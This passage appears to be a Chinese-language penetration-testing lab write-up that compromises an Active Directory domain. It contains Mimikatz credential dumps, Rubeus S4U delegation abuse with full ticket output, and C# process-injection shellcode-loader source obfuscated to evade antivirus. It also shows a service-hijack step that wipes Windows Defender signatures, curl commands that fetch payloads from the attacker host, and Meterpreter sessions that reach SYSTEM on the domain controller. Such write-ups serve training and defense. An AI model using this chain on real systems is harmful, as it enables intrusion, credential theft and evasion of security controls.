    * Password : (null)
   kerberos :
    * Username : WEB01$
    * Domain   : evil.com
    * Password : 95 0f f9 df e2 4d af 3e f1 5e e0 a9 f3 78 0b 91 d2 d5 5e b9 11 1f b5 bf e2 14 dc e4 91 78 0e 0f a4 e4 56 1a 97 2b ed f8 f8 fd b3 5e 58 2d 19 ef bf 25 f3 cc 15 01 00 09 9b e6 f0 49 d0 bf 22 6c 32 02 f3 fb cd 7d 0c a6 19 03 92 31 02 8d d3 36 b0 0c 73 cb 4c cf 40 c5 f5 43 d5 91 7c 7e aa da 8c 57 dc 96 36 bc dd a1 d0 87 8a b4 da 13 7c b0 fe 4d 87 47 83 cf 2d 33 2c 98 a1 7d 4d d3 93 45 65 3b c1 45 0f c5 64 88 37 d5 b5 95 6b 31 0b e8 c3 e9 73 b6 f3 e3 e6 1e 3c c0 db 1b c5 2c ed 4f 7c 4d 43 6b 0f 7e 0f bc f4 bb 99 d4 fd cb 0f 66 3a e6 14 7d a1 d5 d5 83 92 5c 3e ca 61 cd 41 25 8c 04 bb 69 f0 11 5e e3 dd 69 b7 08 f5 bd c7 57 ad 94 15 cd 45 ae 54 68 a2 b9 2c 1a bc 60 9c ae 16 38 7d 37 d1 d9 f5 e9 87 ea 75 9a 83 dc 10 88 
   ssp :
   credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WEB01$
Domain            : EVIL
Logon Server      : (null)
Logon Time        : 10/29/2020 3:47:09 PM
SID               : S-1-5-18
   msv :
   tspkg :
   wdigest :
    * Username : WEB01$
    * Domain   : EVIL
    * Password : (null)
   kerberos :
    * Username : web01$
    * Domain   : EVIL.COM
    * Password : 95 0f f9 df e2 4d af 3e f1 5e e0 a9 f3 78 0b 91 d2 d5 5e b9 11 1f b5 bf e2 14 dc e4 91 78 0e 0f a4 e4 56 1a 97 2b ed f8 f8 fd b3 5e 58 2d 19 ef bf 25 f3 cc 15 01 00 09 9b e6 f0 49 d0 bf 22 6c 32 02 f3 fb cd 7d 0c a6 19 03 92 31 02 8d d3 36 b0 0c 73 cb 4c cf 40 c5 f5 43 d5 91 7c 7e aa da 8c 57 dc 96 36 bc dd a1 d0 87 8a b4 da 13 7c b0 fe 4d 87 47 83 cf 2d 33 2c 98 a1 7d 4d d3 93 45 65 3b c1 45 0f c5 64 88 37 d5 b5 95 6b 31 0b e8 c3 e9 73 b6 f3 e3 e6 1e 3c c0 db 1b c5 2c ed 4f 7c 4d 43 6b 0f 7e 0f bc f4 bb 99 d4 fd cb 0f 66 3a e6 14 7d a1 d5 d5 83 92 5c 3e ca 61 cd 41 25 8c 04 bb 69 f0 11 5e e3 dd 69 b7 08 f5 bd c7 57 ad 94 15 cd 45 ae 54 68 a2 b9 2c 1a bc 60 9c ae 16 38 7d 37 d1 d9 f5 e9 87 ea 75 9a 83 dc 10 88 
   ssp :
   credman :
   
```

## 横行移动

### pass the hash

```
Rubeus.exe s4u /user:web01$ /rc4:d071426c2accc17571310b2e6d63c0f1 /impersonateuser:administrator /msdsspn:cifs/file01 /ptt

Rubeus.exe s4u /user:web01$ /rc4:d071426c2accc17571310b2e6d63c0f1 /impersonateuser:administrator /msdsspn:cifs/file01 /ptt

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4 

[*] Action: S4U

[*] Using rc4_hmac hash: 77627f5c17e9cea651a455bb4a155356
[*] Building AS-REQ (w/ preauth) for: 'evil.com\web01$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIEpjCCBKKgAwIBBaEDAgEWooIDyTCCA8VhggPBMIIDvaADAgEFoQobCEVWSUwuQ09Noh0wG6ADAgEC
      oRQwEhsGa3JidGd0GwhldmlsLmNvbaOCA4kwggOFoAMCARKhAwIBAqKCA3cEggNz09xP7VZlfGYiWhZd
      fFpK56mKFbCAPXTJ3Ha1QKsk4j+OalGTN6JOIch2/1xLyGX0wbpWgmZKCjjwu6/nR6S+XrAKiNnlXRrS
      kRkKK/B7hDMXJ9DOhSeFb06hVokKvVEe5TJDPS/t80Q1Ll/UHWYHX6UN61psCx4pXs292AwgScmcFAL/
      dPjEMl10i4OO3KrEIsz5jXzLQiITMXa1IcaGBWJSvglQyCio0PFliB1AVQs8WUZbAtpiVhgUgsjnVm5D
      EcEzdJP1KOrrrEsDnGnPMZpEp2WrsSoh2uRMZZYM/j0n6ezz40cozoPgdO7A1bpdWGd2t9v0ahhMUyDQ
      ZfedVxxsQ6jvP4YHimSc/SPhYLpoCjTBatVlxJ8fYLsciLPb8TJQX3axAujpggu7vuqVAbjj9F/ejgmu
      svW0MhwsdA+rUl5cQ7j0wz6xXcmAmKPqx0ggh+ijfdQkQW2kP0LWo3vrEL8+45qwtzjmh/E0wSYvkYim
      JVvRsD8f0SQTeAV3/dKcPH5qMk8Qf+Aw/iteAShGOtMoZeExRJugycLqrXAJgAsru8qPx4kgFhioYH70
      z4GeRvYz0D559NTEarkjADBpFxvwkHU+9VrbhoHubq9VpHadt8Iqys0G4XItugFhmdgPfRTAuJgqmKS5
      e+RhTrbh7+4LpUiVsBJ8r2T8/tWJlsTjEsuUVvDISZH0p4yev6NXV69RdBN/4MBJA/LjwUM0EbdYc6ny
      uuVGOc12ise0WiMNzdVciJ30X+zhEiEVeUbche42uxMxuejQXnBaWYtP5vA3fIG6dzdSWxut1CLduhrH
      IcH152iWQn/WZxXSMDoAxpZM686+2OJN35K/cKMBSQpkoljmDkw74hZnKrGztHYc1OzRYeS3Zvo9vwnV
      L+gHzYnWAh14lonkqQTT7bpqe3im9uSLq8WCZMI9mRxkhJ31WhyjQkr3ytTUTbItNwyG0fFy4zcgQlFm
      R8LdeDfBo8jHTYWaVooHCu9mux51hED+v/L7hLBIepxJ0q9s3kVlFkOrjnaVjkRYDCFDdLa2eiBwYslH
      piZrmgrs0XcUrNriCQ3D9rUba2BovaxKMCfAdG8CWkS7J1O5xzYQH7zNWrVIwPZxjDMB4V5IQoitIFHz
      gTKhvb7AaPGA9KDH7paIfYHjOJIJFJ2vMmwt5auxw6OByDCBxaADAgEAooG9BIG6fYG3MIG0oIGxMIGu
      MIGroBswGaADAgEXoRIEENLtzAO81/CFT8RiqgmJorChChsIRVZJTC5DT02iEzARoAMCAQGhCjAIGwZ3
      ZWIwMSSjBwMFAEDhAAClERgPMjAyMTA4MjcxMzE3MTNaphEYDzIwMjEwODI3MjMxNzEzWqcRGA8yMDIx
      MDkwMzEzMTcxM1qoChsIRVZJTC5DT02pHTAboAMCAQKhFDASGwZrcmJ0Z3QbCGV2aWwuY29t


[*] Action: S4U

[*] Using domain controller: dc02.evil.com (192.168.96.130)
[*] Building S4U2self request for: 'web01$@EVIL.COM'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'web01$@EVIL.COM'
[*] base64(ticket.kirbi):

      doIFODCCBTSgAwIBBaEDAgEWooIETjCCBEphggRGMIIEQqADAgEFoQobCEVWSUwuQ09NohMwEaADAgEB
      oQowCBsGd2ViMDEko4IEGDCCBBSgAwIBEqEDAgEEooIEBgSCBAKU4wzVN8e0cMhdnWqY29kAxG3ikAqd
      0bAhzaLaWFQpvEVDwVukbj3q01UCb07bb9WQWDQFjsiQ1cfHbGzJ92gUnLn7blcowHmnp3lbMBzOKvSu
      TJlt56RDs1lSJTW5QlRV7hSiFql3TxBh/sy45wbvA10eF7C2TZw7HvDaK/nYSzfatFKMEatrC5gjpmb8
      pKqGkceNzizx/zOgoq2dH8LkBjH6WnpuONq+HKm6RIplNFzHQaRYdYQe04YdtKBKFrYth9JBsIi7Zx/n
      lEfDJAr9FvKGQYbsJre6ZNCoiCe75iPWY84bTOy1HV9qIpUTigmZ4Kt8L0nmwJRgxhn54xO8cHa15LUm
      maC1DqtR5TeAbqTnIfxetE3CsW2BaGperPDfFY9LEiEoMEk4K7/2cR5RW2aoMVWjU953/Y2Xm90Qt881
      iDhdpUp15VcdttqbQTjLxGoja9Slr3ypmRgnohdsMzyQgN9P2mzyn7hkfzVcTyFHXskDpWselo2oH23a
      0MNCEnEjLdDEIcOQt/RpQAyT9nn5ildySo/faW7PN3Ya2B+kzWG+SpyCWED38pscEgTGBhvygbvOqkFB
      hvI96zwEOWZgk4YnFz+5nAkzNAM/4dA13+ue3H9Jf+QwdkYgtS5+Xo2i4wDib8czivaJWoUUsMK7Rh4W
      8e2PT2JHdPi0huLav2NOklkYJlvUEYLyENIDP+/MyjU0hnA0tpSI2GYqWV5dXX75t6cPpUQz/hjqUePD
      ayrOVuwIV7j+6IF1sk2+AMtP31JNI8Eud9SQ1fvsekEjDAhPEg3ZUSvzxLB62XpPZ6QA5xUaijlTMXO+
      1T4ixqEXRRaR/aY5mbAPF2oCkX5gzqbDr/6T/M+sNaOszNMjSxn8QBOxlQzozA0rbnra3V3hB/KEukv2
      ywCLUxm+TZENpJLvLbe4atOrZBsEF58RiIDyKSpOVo/pSqLWP2iokaISAWtBqtNXux+DXpmMga0E8Qy6
      zCfdch/Es3rHhmDVsV9rd54xleY90Gp2wsddz51ExVy0gES/KxRfdlT/DdlMetd1Pd25HxoW9Qc5f7Uj
      s9JhNbQIOeP7NeXg3G8ePI9pYAbqoKs5fDlRwAJESI/a1tuQPpSJpt1i5cgLV+TRLO4/gdM4Sh7diNJI
      aq6OMPeK4kg3Pgcw2pQcSfwJTEqK3aZ2CmhbDzjV5zWLNsA1Tkwi+t0OdHU3Ozs5aObBJSWMnWgvjlll
      Tl5sPsGOoqKDJiW1jWtt4GW2TRjSOi58oIBwGQGVfn0nteoPSsuUCs3Zx8dZl6Jg8lT9RY9UtYSMC2Am
      +pPzULR95dh5+qKLdB4h95oHcuoXErjV6BP/+qrJ2o6zFNMYsOwdvTLdcy6jgdUwgdKgAwIBAKKBygSB
      x32BxDCBwaCBvjCBuzCBuKArMCmgAwIBEqEiBCDQjmk76qm17Mly56ddlJQRzv/O22bFJYQFwr/wd/pr
      s6EKGwhFVklMLkNPTaIaMBigAwIBCqERMA8bDWFkbWluaXN0cmF0b3KjBwMFAEChAAClERgPMjAyMTA4
      MjcxMzE3MTNaphEYDzIwMjEwODI3MjMxNzEzWqcRGA8yMDIxMDkwMzEzMTcxM1qoChsIRVZJTC5DT02p
      EzARoAMCAQGhCjAIGwZ3ZWIwMSQ=

[*] Impersonating user 'administrator' to target SPN 'cifs/file01'
[*] Using domain controller: dc02.evil.com (192.168.96.130)
[*] Building S4U2proxy request for service: 'cifs/file01'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/file01':

      doIFtDCCBbCgAwIBBaEDAgEWooIE1DCCBNBhggTMMIIEyKADAgEFoQobCEVWSUwuQ09NohkwF6ADAgEC
      oRAwDhsEY2lmcxsGZmlsZTAxo4IEmDCCBJSgAwIBEqEDAgEEooIEhgSCBILv/MpHHADskF5HDRRHJMpc
      peAtB2KR/bXH3x89S6e/K0shvzSXKMT3OoZ3+j5W6B2w0X6Mv+8uTe+TftT11Lim1+c7zz7vU3532A+W
      cH5Iiq4WB1vkVrV/CssxBG78O/irPli9DX3fXy95QWZO3ecN6aLB1J0dyzA2MZpifLKlIakfbBoboEC5
      09Lp9/neaK8nQwLyVoHSGWsVHKHFMTEznZduK6KzBZ0MJu6CMOzOVSvD4XOBiSPON/oNF+D7Z2RFiqvz
      pQK6I6QYjgqsBGxVqBdRXVRxXhIh4TiAAd9xiv+iz8AOLrB2rpuHNS9iN0B/ELIuDDarfMd7QDo2F75d
      bvizztIndeuaTkPVEUB/R5iVe+PwV+Sw8K2yxH61pbP3IaNShm7Enitz3VGxQ3Gp+d+pCQyS91AbDnpH
      vG3lSrDtePIpj6dCo34OTAjKuBEoxo3EqSiDaUaDlETV0M9aC0Te4rOahXMDt55apzuNnpigZ9/Cq+li
      o8QVqlH3b3eLJ91UFjIUx67WKbzMHrTCqsZhrqo2KwcdQ09/L/BBsR4+7XL2g3o3kEB3PmlgL1VgMiFi
      j2L+3Ac4EH9INIhUgggfsvQI+S6OqL3Da/OcNj3RTqrS1BRmN0+IWtGBe3VpAkvtzDRCra5nSEY+9ACP
      8IaCxtU80FWq90pqBl4CvU6ZvfpeDuUXf8oyZmS8zUUCNrGldn+xjWy5Y8EJAQVF/JArt4EpLrnXO2Y9
      rLRLHNaHcoKEoDGTCAwUgee6bvQ/ZxxrfrJdF3FDUWkAMObj1KSVlFBhi2zhlbP2jI3GQE2AzDyha7gl
      jgaiAf1NHHDP9HZHLS7J08wyGJ0IdIFChPCUzuF83Gxvxp1XVytFw6TOOogOz1FKWg4p67qQi4CLtkPO
      qX0AgoJ1f0i8OdaqLBARvbYf2RNOf9GSeXUP64YxW5CwpfLRenyckXhJj2mCoEe4/x1xLTVTe1rIOiLz
      /0juVoraghnuJ0QiQlIuOIPIMCXo7MNyc9rOMIwWdRCVFIY7SUDPaRGMJn7wQ0NV0t5Z/MEZXiGCPJDh
      k0eZFhLjSG0B/bk4I1OngbbQY4KF4cmRBEFnJqAn5XCy403fnqDAUmI/DK41aEPJNjgqsQXhaSg9lcoT
      zbMoFPNeOznbmHjGdgrtvZtPWzCNh5UgTFUjyIIc5xmfmzIeDuiOGH3JHAx+BGRywWz1fGKzjQ1l5HQz
      Jw4dqmOOhX7wQuapO9HrxbzxycAS7wu5YedGhuNBBQN4RxEjCcduonpyXwmvj0q6VB41QLggtfyAXB4m
      mda3095IE+kQHb/sH2ZFlmETQ7VrwLLH8jmdrv4637hm3twrASeAkRL4pNobIxUMG0KC1+lmmVwqMOK6
      GPsylmrIER9MrjYuAw0mmXxv7N2bry22jz4hAhgO2xhHxjGz0UmHu6Nm/wX2+Ho2VUo4fBrBpkAxkV9O
      1oO34aYNOBNjHTHkyygKywD8RyxX8hpM68MGvk7b48JkDG+Ay9a/TfGDZrcUs7TOTwWhYTxIYeiYv6OB
      yzCByKADAgEAooHABIG9fYG6MIG3oIG0MIGxMIGuoBswGaADAgERoRIEEAUpCal486XEoedzSdGmAF2h
      ChsIRVZJTC5DT02iGjAYoAMCAQqhETAPGw1hZG1pbmlzdHJhdG9yowcDBQBAoQAApREYDzIwMjEwODI3
      MTMxNzEzWqYRGA8yMDIxMDgyNzIzMTcxM1qnERgPMjAyMTA5MDMxMzE3MTNaqAobCEVWSUwuQ09NqRkw
      F6ADAgECoRAwDhsEY2lmcxsGZmlsZTAx
[+] Ticket successfully imported!

```

验证
```
PS C:\Users\Public\Downloads> klist
klist

Current LogonId is 0:0x3e7

Cached Tickets: (1)

#0>     Client: administrator @ EVIL.COM
        Server: cifs/file01 @ EVIL.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize 
        Start Time: 8/27/2021 6:17:13 (local)
        End Time:   8/27/2021 16:17:13 (local)
        Renew Time: 9/3/2021 6:17:13 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0 
        Kdc Called: 
PS C:\Users\Public\Downloads> ls \\file01\c$
ls \\file01\c$


    Directory: \\file01\c$


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        6/24/2020   1:07 AM                PerfLogs                                                              
d-r---        6/24/2020   7:24 AM                Program Files                                                         
d-----        6/24/2020   7:21 AM                Program Files (x86)                                                   
d-r---        6/24/2020   1:48 AM                Users                                                                 
d-----        6/24/2020   1:22 AM                Windows                 
```

### Get shell
使用lat.exe file01 SensorService c:\\process_inject.exe
其中Process_inject.exe
```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Net;
using System.Diagnostics;

namespace Inject
    {
        class Program
        {
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
            [DllImport("kernel32.dll")]
            static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
            [DllImport("kernel32.dll")]
            static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
            [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
            static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
            public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();
        static void Main(string[] args)
            {
                IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4,0);
                if (mem == null)
                {
                    return;
                }
                byte[] buf = new byte[638] { 0xfe, 0x4a, ... };
                for (int i = 0; i < buf.Length; i++)
                {
                    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
                }
                int size = buf.Length;
                Process[] expProc = Process.GetProcessesByName("spoolsv");
                int pid = expProc[0].Id;
                IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
                IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
                IntPtr outSize;
                WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0,IntPtr.Zero);
            }
        }
    
}

```
由于目标机器上大概率存在av，故使用凯撒移位

## 获取域管理员权限

meterpreter > sessions 4
[*] Backgrounding session 2...
[*] Starting interaction with 4...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
EVIL\paul
FILE01\Administrator
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token EVIL\paul
[-] User token EVILpaul not found
meterpreter > shell
Process 4108 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1282]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd c:\
cd c:\

c:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D2E3-655A

 Directory of c:\

08/28/2021  10:13 PM             6,656 hollow.exe
08/28/2021  10:24 PM             6,144 inject.exe
08/28/2021  10:06 PM             7,168 met.exe
08/28/2021  10:38 PM             7,168 met2.exe
06/24/2020  01:07 AM    <DIR>          PerfLogs
08/28/2021  10:56 PM             6,144 process_inject.exe
06/24/2020  07:24 AM    <DIR>          Program Files
06/24/2020  07:21 AM    <DIR>          Program Files (x86)
06/24/2020  01:48 AM    <DIR>          Users
06/24/2020  01:22 AM    <DIR>          Windows
               5 File(s)         33,280 bytes
               5 Dir(s)   3,873,210,368 bytes free

c:\>exit
exit
meterpreter > bg
[*] Backgrounding session 4...
msf6 exploit(multi/handler) > explot -j
[-] Unknown command: explot
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 3.
[*] Exploit completed, but no session was created.

[*] Started HTTPS reverse handler on https://192.168.49.96:443
msf6 exploit(multi/handler) > sessions 4
[*] Starting interaction with 4...

meterpreter > impersonate_token EVIL\\paul
[+] Delegation token available
[+] Successfully impersonated user EVIL\paul
meterpreter > upload lat.exe c:\\lat.exe
[*] uploading  : /home/osep/Modules/module17/lat.exe -> c:\lat.exe
[-] core_channel_open: Operation failed: Access is denied.
meterpreter > shell
Process 4804 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.1282]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
evil\paul

C:\Windows\system32>cd c:\                         

cd c:\

c:\>
c:\>curl 192.168.49.96:8080/lat.exe > lat.exe
curl 192.168.49.96:8080/lat.exe > lat.exe
Access is denied.

c:\>cd users
cd users

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D2E3-655A

c:\Users\Public\Downloads>curl 192.168.49.96:8080/process_inject.exe > process_inject.exe
curl 192.168.49.96:8080/process_inject.exe > process_inject.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  6144  100  6144    0     0   6144      0  0:00:01 --:--:--  0:00:01 43574

c:\Users\Public\Downloads>copy process_inject.exe \\dc02\c$
copy process_inject.exe \\dc02\c$
        1 file(s) copied.

c:\Users\Public\Downloads>lat.exe dc02 SensorService c:\\process_inject.exe
lat.exe dc02 SensorService c:\\process_inject.exe
Got handle on SCManager on dc02: 2329631794944.
Got handle on target service SensorService: 2329631795760.
Overwrote service executable to become '"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All', result: True.
Launched service, defender signatures should be wiped.
Overwrote service executable to become 'c:\\process_inject.exe', result: True.
Launched service. Check for execution!
Restored service binary to 'C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p', result: True.

c:\Users\Public\Downloads>
[!] https://192.168.49.96:443 handling request from 192.168.96.130; (UUID: i3lpnx2z) Without a database connected that payload UUID tracking will not work!
[*] https://192.168.49.96:443 handling request from 192.168.96.130; (UUID: i3lpnx2z) Staging x64 payload (201308 bytes) ...
[!] https://192.168.49.96:443 handling request from 192.168.96.130; (UUID: i3lpnx2z) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 5 opened (192.168.49.96:443 -> 127.0.0.1) at 2021-08-29 06:11:25 +0000


c:\Users\Public\Downloads>exit
exit
meterpreter > sessions 5
[*] Backgrounding session 4...
[*] Starting interaction with 5...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : DC02
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : EVIL
Logged On Users : 9
Meterpreter     : x64/windows
meterpreter > bg
[*] Backgrounding session 5...
msf6 exploit(multi/handler) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                         Connection
  --  ----  ----                     -----------                         ----------
  1         meterpreter x64/windows  IIS APPPOOL\DefaultAppPool @ WEB01  192.168.49.96:443 -> 127.0.0.1 (192.168.96.132)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WEB01         192.168.49.96:443 -> 127.0.0.1 (192.168.96.132)
  3         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ TEST          192.168.49.96:443 -> 127.0.0.1 (192.168.96.100)
  4         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ FILE01        192.168.49.96:443 -> 127.0.0.1 (192.168.96.131)
  5         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ DC02          192.168.49.96:443 -> 127.0.0.1 (192.168.96.130)
